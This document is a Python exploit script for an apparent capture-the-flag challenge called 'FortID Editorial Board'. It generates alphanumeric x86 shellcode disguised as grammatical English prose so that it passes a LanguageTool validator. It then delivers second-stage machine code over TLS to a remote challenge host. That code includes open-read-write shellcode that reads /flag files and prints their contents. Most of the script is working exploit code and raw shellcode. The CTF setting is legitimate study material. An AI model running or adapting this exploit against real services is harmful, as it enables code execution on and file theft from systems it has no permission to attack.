#!/usr/bin/env python3
"""FortID Editorial Board: native-safe, comma-free Stage9 (local CTF test).

A *new* 16-byte prologue replaces `AW,ax:` without changing the 117-byte
first-stage length or any of its POP EBX / INT80 offsets. It avoids the
permanent COMMA_PARENTHESIS_WHITESPACE mark at absolute offset 618.

Only a manuscript verified by the provided validate.py is sent remotely.
Requires original validate.py, the accepted 899-byte Stage8 native manuscript,
and language_tool_python in a Kali Python environment.
"""
from __future__ import annotations
import argparse, itertools, importlib.util, json, re, socket, ssl, struct, subprocess, sys, time, shutil
from pathlib import Path

ALLOWED = set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz .,;:'-?!")
SKIP = b' A clear voice guided the guests through an odd afternoon.'
assert len(SKIP) == 58
MARK = b'\n[STAGE9_NATIVE_COMMA_FREE_OK]\n'

# Opcode 0x2d = SUB EAX,imm32; byte 5 of English word is a condition jump.
# EAX was 0, the imm32 is nonzero and positive, so JB (r), JS (x), JNE (u) are taken.
# The first character must have the right low byte to generate CD at +115.
STARTS = {
    'a': ['after','anger','amber','actor','altar','armor','aider','ardor','annex','affix','adieu','amour'],
    'S': ['Sugar','Sober','Saber','Super','Sewer','Savor','Spear','Solar','Sitar','Sever','Sioux','Snafu'],
}
# Caller could add more English words if LanguageTool flags a candidate.
SECONDS = {
    'a': ['dawn','dusk','door','dear','date','dine','dove','dare'],
    'S': ['rain','rose','road','rest','rise','rare','rock','ring'],
}


def first90_variants():
    """Exactly seven ASCII bytes; 6 one-byte register ops and one CS prefix.

    This compensates for the +3-byte comma-free branch prologue, preserving
    code length 117 and syscall at +115, and target POP EBX at +100.
    """
    ops = ('R','A','B','P','A','X')
    seen=set()
    for tup in set(itertools.permutations(ops)):
        # R must push EDX=0 before B increments, and P must be popped by X.
        if not (tup.index('R')<tup.index('B') and tup.index('R')<tup.index('P')<tup.index('X')):
            continue
        for j in range(6):
            w=''.join('.'+v if k==j else v for k,v in enumerate(tup)).encode()
            if w not in seen:
                seen.add(w);yield w


def second101_variants():
    """14 ASCII bytes, SYS_READ args with EAX3, EDX115, ECX+=2.

    Validate instruction schedules symbolically instead of assuming all
    textual permutations have the same semantics.
    """
    ops=('B','B','R','X','j','Z','A','A')
    seen=set()
    for tup in set(itertools.permutations(ops)):
        stack=[];edx=1;eax=0x3b;ecx=0;valid=True
        for op in tup:
            if op=='B':edx+=1
            elif op=='A':ecx+=1
            elif op=='R':stack.append(edx)
            elif op=='X':
                if not stack:valid=False;break
                eax=stack.pop()
            elif op=='j':stack.append(115)
            elif op=='Z':
                if not stack:valid=False;break
                edx=stack.pop()
        if not valid or (eax,edx,ecx,stack)!=(3,115,2,[]):continue
        # 2x B, 2x A, R, X, Z = 7 ASCII bytes, 'js' = 2 bytes.
        # Five CS prefixes give 14 bytes. Prefixes only before register
        # instructions (no memory destination, so no CS writes).
        for js in itertools.combinations(range(8),5):
            q=b''.join((b'.' if i in js else b'')+(b'js' if o=='j' else o.encode()) for i,o in enumerate(tup))
            if len(q)==14 and q not in seen:
                seen.add(q);yield q


def build(baseline, starter, second, b90, b101):
    initial=starter[0]
    assert initial in ('a','S') and len(starter)==5
    assert starter[-1] in ('r','u','x')
    assert second[0] == ('d' if initial=='a' else 'r') and len(second)==4
    # 3 writes to byte offsets 74,82,90, followed by SUB EAX and taken branch.
    prologue=b' AJ AR AZ-'+starter.encode()+b':'
    assert len(prologue)==16 and prologue[14] in b'rux' and prologue[15]==0x3a
    assert (prologue[14]==ord('r') or prologue[14]==ord('x') or prologue[14]==ord('u'))
    # +74 first ADD modifies +115, +82 second ADD modifies +116.
    # +85..89 (unchanged from remotely proven Stage8) INC ECX twice,
    # +90 third ADD targets +100 after +2 (0x62 offset 'b').
    plain_end=(b'.E' if initial=='a' else b' E')
    code=(prologue+SKIP+b' As-'+second.encode()+b' At.AA.G Ab'+
          b90+b' '+b101+plain_end)
    assert len(code)==117,(len(code),code)
    assert code[74:77]==b' As' and code[82:85]==b' At'
    assert code[85:90]==b'.AA.G' and code[90:93]==b' Ab'
    assert code[100:101]==b' ' and code[115:117]==plain_end
    # Before branch: zero AL; AND zeroes the 3 ADD opcodes at +74,+82,+90.
    modified=bytearray(code)
    for i in (74,82,90):modified[i]=0
    al=(-ord(initial))&255
    modified[115]=(modified[115]+al)&255
    al=(al-ord(second[0]))&255
    modified[116]=(modified[116]+al)&255
    modified[100]=(modified[100]+al)&255
    assert al==0x3b
    assert modified[100]==0x5b and modified[115:117]==b'\xcd\x80'
    assert modified[90:93]==b'\x00Ab' # no CS before third writer
    # Quick symbolic simulation of first90, includes a prefix on a reg op.
    stack=[]; edx=0; eax=0x3b; ecx=2
    for q in b90.replace(b'.',b''):
        if q==82:stack.append(edx)        # R
        elif q==65:ecx+=1                # A
        elif q==66:edx+=1                # B
        elif q==80:stack.append(eax)      # P
        elif q==88:eax=stack.pop()        # X
        else:raise ValueError(q)
    assert edx==1 and ecx==4 and eax==0x3b and stack==[0]
    # +100 POP EBX must consume zero, leaving empty stack.
    stack.pop();assert not stack
    assert len(b101)==14
    # +101 second101 increases ECX by two more: read target EIP+6.
    assert baseline[605:609]==b'able'
    msg=baseline[:609]+code+baseline[726:]
    assert len(msg)==899 and msg[605:609]==b'able'
    assert all(z in ALLOWED for z in msg)
    return msg,bytes(modified)


def marker_second_stage():
    # Position 6..120 gets overwritten by read count 115; syscall returns
    # at offset 117, and two-byte trampoline at +117/+118 returns to +6.
    # JMP CALL-site; POP ECX; write(1, msg, len); exit(0).
    body=(b'\x59\xba'+struct.pack('<I',len(MARK))+b'\x6a\x01\x5b\x6a\x04\x58\xcd\x80'+
          b'\x31\xdb\x6a\x01\x58\xcd\x80')
    core=b'\xeb'+bytes([len(body)])+body+b'\xe8'+struct.pack('<i',-len(body)-5)+MARK
    assert len(core)<=111
    result=core+b'\x90'*(111-len(core))+b'\xeb\x8f\x90\x90'
    assert len(result)==115 and result[111:113]==b'\xeb\x8f'
    return result


def compute(payload,lt,v):
    fields,err=v.structural(payload.decode('ascii'))
    if err:return dict(ok=False,score=0,reason=err.reason,words=0)
    txt,words,sentences,rep,avg=fields
    matches=lt.check(txt)
    spelling=sum(v.is_spelling(m) for m in matches)
    density=len(matches)*100/len(words)
    score=round(max(0,min(100,100-density*5-spelling*1000/len(words)-rep*55-max(0,avg-24)*0.6)),2)
    return dict(ok=(not spelling and density<=2.2 and score>=88),score=score,
                issues=len(matches),spelling=spelling,words=len(words),repeat=round(rep,4),
                matches=[(getattr(m,'rule_id',getattr(m,'ruleId','')),m.offset) for m in matches])


def remote(host,port,manuscript,stage2,mode,deadline,save):
    t0=time.monotonic();rx=bytearray()
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    try:
        with socket.create_connection((host,port),timeout=15) as sk:
            with ctx.wrap_socket(sk,server_hostname=host) as s:
                sent_first=False;sent_second=False
                s.settimeout(1.5)
                while time.monotonic()-t0<deadline:
                    try:part=s.recv(8192)
                    except socket.timeout:continue
                    if not part:break
                    rx.extend(part)
                    print('RX',round(time.monotonic()-t0,2),repr(part[:250]),flush=True)
                    if not sent_first and b'Submit your manuscript:' in rx:
                        if mode=='joint':s.sendall(manuscript+b'\n'+stage2);sent_second=True
                        else:s.sendall(manuscript+b'\n')
                        sent_first=True
                        print('TX first 900; stage2 now=',sent_second,flush=True)
                    if mode=='reviewing' and sent_first and not sent_second and b'The board is reviewing' in rx:
                        s.sendall(stage2);sent_second=True
                        print('TX stage2 after reviewing',flush=True)
    except (OSError,ssl.SSLError) as e:print('Network:',repr(e))
    Path(save).write_bytes(rx)
    yes=MARK in rx
    print('SUMMARY',mode,'marker',yes,'accepted',b'Accepted by the anti-slop desk' in rx,'rx bytes',len(rx),'saved',save)
    return yes



ORW_ENTRY = bytes.fromhex(
    '5e89f331c931d26a0558cd8085c0790c8d5e06'
    '6a0558cd8085c0782c89c381ec0001000089e1'
    'ba0001000031c0b003cd8085c07e0c89c289e1'
    '6a015b6a0458cd8031db6a0158cd80f7d889'
    'c36a0158cd80'
)
assert len(ORW_ENTRY)==81


def orw_stage2(p1='/flag',p2='/flag.txt'):
    f1=p1.encode()+b'\x00';f2=p2.encode()+b'\x00'
    assert 1<len(f1)<128 and 1<len(f2)<128
    asm=bytearray(ORW_ENTRY);asm[18]=len(f1)
    core=b'\xeb'+bytes([len(asm)])+asm+b'\xe8'+struct.pack('<i',-len(asm)-5)+f1+f2
    assert len(core)<=111,(len(core),p1,p2)
    return core+b'\x90'*(111-len(core))+b'\xeb\x8f\x90\x90'


def local_test(manuscript,stage2,which,delay):
    cmd=['qemu-i386','./editorial_board'] if which=='qemu' else ['./editorial_board']
    if which=='qemu' and not shutil.which('qemu-i386'):
        print('qemu-i386 is missing, skipped local test');return False
    try:
        p=subprocess.Popen(cmd,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        p.stdin.write(manuscript);p.stdin.flush()
        time.sleep(delay)
        if p.poll() is None:p.stdin.write(stage2);p.stdin.flush()
        p.stdin.close();p.stdin=None
        out,err=p.communicate(timeout=100)
        print('LOCAL',which,'rc=',p.returncode,'marker=',MARK in out,'stdout=',repr(out[-200:]),'stderr=',repr(err[-100:]))
        return MARK in out
    except (OSError,subprocess.TimeoutExpired,BrokenPipeError) as exc:
        print('LOCAL error:',repr(exc));return False


def main():
    ap=argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--baseline',default='editorial_stage8_native_accepted.txt')
    ap.add_argument('--validate',default='validate.py')
    ap.add_argument('--host',default='editorial-board-0af55b94bb8f.inst2.ctf.fortid.com')
    ap.add_argument('--port',type=int,default=1337)
    ap.add_argument('--limit',type=int,default=1400)
    ap.add_argument('--deadline',type=int,default=90)
    ap.add_argument('--dry-run',action='store_true')
    ap.add_argument('--no-remote',action='store_true')
    ap.add_argument('--local',choices=['qemu','native'],help='verify second-stage first, before remote')
    ap.add_argument('--delay',type=float,default=2.5)
    ap.add_argument('--orw',action='store_true',help='try two known flag paths only after remote marker proof')
    ap.add_argument('--paths',nargs=2,default=['/flag','/flag.txt'])
    a=ap.parse_args()
    baseline=Path(a.baseline).read_bytes()
    assert len(baseline)==899 and baseline[605:609]==b'able'
    # Prioritize English word combinations and prefixes that visually resemble
    # familiar abbreviations: gives earlier first real LT verdict.
    b90s=sorted(first90_variants(),key=lambda q:(q not in (b'.RABPAX',b'RAB.PAX',b'.R.ABPAX',b'.RABPAX'),q))
    b101s=sorted(second101_variants(),key=lambda q:(q!=b'BB.R.X.js.Z.AA',q))
    print('Machine-code patterns:',len(b90s),len(b101s),flush=True)
    starters=[]
    for k in ('a','S'):
        for w in STARTS[k]:
            if w[0]==k and w[-1] in 'rux':
                for second in SECONDS[k][:2]:starters.append((w,second))
    print('English prologues:',len(starters),flush=True)
    # Breadth-first search across prologues, then instruction shapes; compare
    # all candidates via the genuine installed LanguageTool, never guess.
    # Avoid the prior Stage9 flaw: 640 tests on ONE prologue/English variant.
    order_index=[(i,j) for i in range(min(55,len(b90s)))
                      for j in range(min(28,len(b101s)))]
    # Diagonal breadth-first ordering explores BOTH 7-byte and 14-byte
    # instruction shapes during the first few hundred LanguageTool calls.
    # Earlier Stage9 spent hundreds of calls on effectively one shape.
    order_index.sort(key=lambda pair:(sum(pair),pair[1],pair[0]))
    order=[(b90s[i],b101s[j]) for i,j in order_index]
    try:
        from language_tool_python import LanguageTool
        if not a.dry_run:
            lt=LanguageTool('en-US')
            sp=importlib.util.spec_from_file_location('editorial_validator',str(Path(a.validate).resolve()))
            val=importlib.util.module_from_spec(sp);sys.modules[sp.name]=val;sp.loader.exec_module(val)
    except ImportError as e:
        if not a.dry_run:raise SystemExit('Need language_tool_python in venv: '+str(e))
    best=None;allr=[]
    try:
        for ix in range(a.limit):
            w,second=starters[ix%len(starters)]
            b90,b101=order[(ix//len(starters))%len(order)]
            payload,patched=build(baseline,w,second,b90,b101)
            info=({'ok':False,'score':0,'reason':'dry-run'} if a.dry_run else compute(payload,lt,val))
            info.update(word=w,subword=second,b90=b90.decode(),b101=b101.decode())
            allr.append(info)
            if best is None or (info['ok'],info['score'])>(best[0]['ok'],best[0]['score']):
                best=(info,payload,patched)
            if ix<8 or ix%40==0 or info['ok']:
                print('TRY',ix+1,info['ok'],info['score'],info.get('issues'),info.get('spelling'),w,b90.decode(),b101.decode(),flush=True)
            if info['ok']:break
    finally:
        if not a.dry_run:lt.close()
    info,first,patched=best
    Path('editorial_stage9_commafree_scores.json').write_text(json.dumps(allr,indent=2))
    Path('editorial_stage9_commafree_candidate.txt').write_bytes(first)
    Path('editorial_stage9_commafree_patched.bin').write_bytes(patched)
    stage2=marker_second_stage()
    Path('editorial_stage9_commafree_stage2.bin').write_bytes(stage2)
    print('BEST',json.dumps(info,indent=2),'checked',len(allr))
    if a.dry_run or not info['ok']:
        print('NO CONFIRMED ACCEPT: no remote submission');return
    res=subprocess.run([sys.executable,a.validate,'--json','editorial_stage9_commafree_candidate.txt'],capture_output=True,text=True,timeout=180)
    print('VALIDATOR',res.returncode,res.stdout,res.stderr)
    if res.returncode!=0:return
    if a.local and not local_test(first,stage2,a.local,a.delay):
        print('No local execution proof; not submitting remotely');return
    if a.no_remote:return
    for mode in ('joint','reviewing'):
        if remote(a.host,a.port,first,stage2,mode,a.deadline,'editorial_commafree_'+mode+'.bin'):
            print('NATIVE STAGE9 SUCCESS: remote second-stage executed')
            if a.orw:
                orw=orw_stage2(*a.paths)
                Path('editorial_stage10_commafree_orw.bin').write_bytes(orw)
                for pathway in ('joint','reviewing'):
                    output='editorial_commafree_orw_'+pathway+'.bin'
                    remote(a.host,a.port,first,orw,pathway,a.deadline,output)
                    found=re.findall(rb'FortID\{[^\r\n}]+\}',Path(output).read_bytes())
                    if found:
                        print('FLAG CANDIDATES:',found)
                        return
            return
    print('Remote Stage9 remains unconfirmed; inspect saved responses.')

if __name__=='__main__':main()
